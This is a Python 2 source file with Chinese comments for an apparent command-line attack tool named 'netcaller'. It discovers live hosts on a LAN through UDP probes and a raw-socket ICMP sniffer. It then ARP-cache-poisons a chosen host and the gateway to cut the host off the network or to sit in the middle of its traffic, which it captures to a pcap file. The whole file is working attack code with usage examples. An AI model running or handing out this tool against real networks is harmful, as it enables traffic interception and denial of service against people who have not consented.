#coding=utf-8

import socket
import os
import sys
import struct
import threading
import signal
import time
import getopt

from ctypes import *
from scapy.all import *
from netaddr import IPNetwork, IPAddress


# 监听的主机(本机内网IP)
host = ""

# 扫描的目标子网
subnet = ""

# 数据包文件路径
path = "arper.pcap"

# ARP缓存投毒功能目前不支持Windows
if os.name == "nt":
    poisoning = False
else:
    poisoning = True

# IP头定义
class IP(Structure):
    _fields_ = [
        ("ihl",          c_ubyte, 4),
        ("version",      c_ubyte, 4),
        ("tos",          c_ubyte),
        ("len",          c_ushort),
        ("id",           c_ushort),
        ("offset",       c_ushort),
        ("ttl",          c_ubyte),
        ("protocol_num", c_ubyte),
        ("sum",          c_ushort),
        ("src",          c_ulong),
        ("dst",          c_ulong)
    ]
    
    def __new__(self, socket_buffer=None):
        return self.from_buffer_copy(socket_buffer)
    
    def __init__(self, socket_buffer=None):
        
        # 协议字段与协议名称对应
        self.protocol_map = {1:"ICMP", 6:"TCP", 17:"UDP"}
        
        # 可读性更强的IP地址
        self.src_address = socket.inet_ntoa(struct.pack("<L", self.src))
        self.dst_address = socket.inet_ntoa(struct.pack("<L", self.dst))
        
        # 协议类型
        try:
            self.protocol = self.protocol_map[self.protocol_num]
        except:
            self.protocol = str(self.protocol_num)
            

# ICMP头定义
class ICMP(Structure):
    
    _fields_ = [
        ("type",         c_ubyte),
        ("code",         c_ubyte),
        ("checksum",     c_ushort),
        ("unused",       c_ushort),
        ("next_hop_mtu", c_ushort)
    ]
    
    def __new__(self, socket_buffer):
        return self.from_buffer_copy(socket_buffer)
    
    def __init__(self, socket_buffer):
        pass


# 批量发送UDP数据包
def udp_sender(subnet, magic_message="PYTHONRULES!"):
    time.sleep(5)
    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
    for ip in IPNetwork(subnet):
            
        try:
            sender.sendto(magic_message, ("%s" % ip, 65212))
        except:
            pass

# 开启嗅探器
def sniffer(host):
    
    # 创建原始套接字，然后绑定在公开接口上
    if os.name == "nt":
        socket_protocol = socket.IPPROTO_IP
    else:
        socket_protocol = socket.IPPROTO_ICMP
    
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
    
    sniffer.bind((host,0))
    
    # 设置在捕获的数据包中包含IP头
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    # 在Windows平台上，我们需要设置IOCTL以启用混杂模式
    if os.name == "nt":
        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    return sniffer

# 扫描内网主机
def scanner(sniffer, magic_message="PYTHONRULES!"):
    
    result = []
    
    t = threading.Thread(target=udp_sender,args=(subnet,))
    t.start()

    try:
        
        while True:
            
            # 读取数据包
            raw_buffer = sniffer.recvfrom(65565)[0]
            
            # 将缓冲区的前20个字节按IP头进行解析
            ip_header = IP(raw_buffer[0:20])
            
            # 输出协议和通信双方IP地址
            # print "Protocol: %s %s -> %s" % (ip_header.protocol, ip_header.src_address, ip_header.dst_address)
            
            # 如果为ICMP，进行处理
            if ip_header.protocol == "ICMP":
                
                # 计算ICMP包的起始位置
                offset = ip_header.ihl * 4
                buf = raw_buffer[offset:offset + sizeof(ICMP)]
                
                # 解析ICMP数据
                icmp_header = ICMP(buf)
                
                # print "ICMP -> Type: %d Code: %d" % (icmp_header.type, icmp_header.code)
                
                # 检查类型和代码值是否为3
                if icmp_header.code == 3 and icmp_header.type == 3:
                    
                    # 确认相应的主机在我们的目标子网内
                    if IPAddress(ip_header.src_address) in IPNetwork(subnet):
                        
                        # 确认ICMP数据中包含我们发送的自定义字符串
                        if raw_buffer[len(raw_buffer)-len(magic_message):] == magic_message:
                            result.append(ip_header.src_address)
                            print "Host Up %d : %s" % (len(result), ip_header.src_address)
            
            
    # 处理CTRL-C
    except KeyboardInterrupt:
        
        # 如果运行在Windows上，关闭混杂模式
        if os.name == "nt":
            sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)    
        
    finally:
        print
        return result

# 恢复网络状态
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    
    # slightly different method using send
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

# 根据IP获取MAC地址
def get_mac(ip_address):
    
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    
    return None

# ARP缓存投毒
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    global poisoning
    if not poisoning:
        print "[*] ARP poison is not available in Windows now! Please use Linux :)"
        return
   
    poison_target = ARP()
    poison_target.op   = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op   = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while poisoning:
        send(poison_target)
        send(poison_gateway)
          
        time.sleep(2)
          
    print "[*] ARP poison attack finished."

    return


# 对某主机进行ARP断网或中间人攻击
def arper(target_ip, gateway_ip, interface="eth0", ip_forward=False, packet_count=1000):
    global poisoning
    global path
    
    # 是否开启流量转发
    if ip_forward:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    
    # 设置嗅探的网卡
    conf.iface = interface
    
    # 关闭输出
    conf.verb  = 0
    
    print "[*] Setting up %s" % interface
    
    gateway_mac = get_mac(gateway_ip)
    
    if gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
    
    target_mac = get_mac(target_ip)
    
    if target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (target_ip,target_mac)
        
    # 启动ARP投毒线程
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
    poison_thread.start()
    
    try:
        print "[*] Starting sniffer for %d packets" % packet_count
        
        bpf_filter  = "ip host %s" % target_ip
        packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
        
    except KeyboardInterrupt:
        pass
    
    finally:
        # 将捕获到的数据包输出到文件
        print "[*] Writing packets to %s" % path
        wrpcap("%s" % path, packets)
    
        poisoning = False
    
        # 等待ARP投毒线程结束
        time.sleep(2)
    
        # 还原网络状态
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)    

        return

# 帮助函数
def usage():
    print r'''
Welcome to use netcaller!

Usage:  
        -m --myhost         - Intranet IP used to monitor data
        -s --subnet         - Scanned segment
        -p --path           - The save path to the packet sniffer
                              Default : ./
        -t --target         - IP address of the host to be attacked
        -g --gateway        - IP address of the gateway
        -i --interface      - Network adapter for monitoring traffic
        -c --count          - The number of packets to be captured
                              Default : 1000
        -f --forward        - Open traffic forwarding
        
Examples:
        python adarper.py -h 10.206.6.6 -s 10.206.6.0/24
        python adarper.py -t 10.206.6.12 -g 10.206.6.1        
'''
    
    sys.exit(0)


# 主函数
def main():
    
    # 是否进行主机扫描
    is_scan = True
    
    global host
    global subnet
    global path
    
    # ARP投毒所需参数
    target_ip = ""
    gateway_ip = ""
    interface = "eth0"
    ip_forward = False
    packet_count = 1000
    
    # 读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:],\
                                   "hm:s:t:g:i:fc:p:",\
                                   ["help", "myhost", "subnet", "target", "gateway", "interface", "forward", "count", "path"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-f", "--forward"):
            ip_forward = True
        elif o in ("-m", "--myhost"):
            host = str(a).strip()
        elif o in ("-s", "--subnet"):
            subnet = str(a).strip()
        elif o in ("-t", "--target"):
            target_ip = str(a).strip()
            is_scan = False
        elif o in ("-g", "--gateway"):
            gateway_ip = str(a).strip()
        elif o in ("-i", "--interface"):
            interface = str(a).strip()
        elif o in ("-c", "--count"):
            packet_count = int(str(a).strip())
        elif o in ("-p", "--path"):
            path = str(a).strip()
        else:
            assert False, "Unhandled Option"
            
    if is_scan:
        if not host or not subnet:
            print "[*] Please specity myhost and subnet!"
            print
            usage()
        else:
            
            # 扫描内网主机
            my_sniffer = sniffer(host)
            host_list = scanner(my_sniffer)
            
            # 是否对特定主机进行ARP缓存投毒
            print "[*] Please input the target number for the ARP attack, 0 to exit"
            
            while True:
                try:
                    cmd = int(str(raw_input("> ")).strip())
                except Exception:
                    print "[*] Invalid input!"
                    continue                    
                
                if cmd > len(host_list) or cmd < 0:
                    print "[*] Invalid input!"
                    continue            
                elif cmd == 0:
                    return
                else:
                    break
            
            # 对选择的主机进行ARP缓存投毒
            target_ip = host_list[cmd-1]
            if not gateway_ip:
                try:
                    gateway_ip = str(raw_input("[*] Please input gateway ip : ")).strip()
                except:
                    return
            if not ip_forward:
                try:
                    cmd = str(raw_input("[*] Do you want to open traffic forwarding?(y/N)")).strip()[0]
                except Exception:
                    pass
                if cmd in ("y", "Y"):
                    ip_forward = True
                    
            arper(target_ip, gateway_ip, interface, ip_forward, packet_count)
    
    else:
        if not target_ip or not gateway_ip:
            print "[*] Please specity target and gateway!"
            print
            usage()
        else:
            # 直接对目标主机进行ARP缓存投毒
            arper(target_ip, gateway_ip, interface, ip_forward, packet_count)

if __name__ == "__main__":
    main()

    

